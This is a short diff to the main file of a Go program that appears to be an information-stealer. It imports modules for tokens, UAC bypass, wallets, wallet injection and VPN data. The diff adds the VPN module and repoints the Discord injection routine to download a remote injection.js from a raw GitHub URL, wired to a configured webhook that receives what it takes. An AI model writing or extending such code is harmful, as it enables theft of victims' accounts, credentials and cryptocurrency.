@@ -16,6 +16,7 @@ import (
 	"github.com/mmmhlecaca/enori/modules/system"
 	"github.com/mmmhlecaca/enori/modules/tokens"
 	"github.com/mmmhlecaca/enori/modules/uacbypass"
+	"github.com/mmmhlecaca/enori/modules/vpn"
 	"github.com/mmmhlecaca/enori/modules/wallets"
 	"github.com/mmmhlecaca/enori/modules/walletsinjection"
 	"github.com/mmmhlecaca/enori/utils/program"
@@ -58,7 +59,7 @@ func main() {
 	go antivirus.Run()
 
 	go discordinjection.Run(
-		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+		"https://raw.githubusercontent.com/mmmhlecaca/enori-utils/refs/heads/main/injection.js",
 		CONFIG["webhook"].(string),
 	)
 	go walletsinjection.Run(
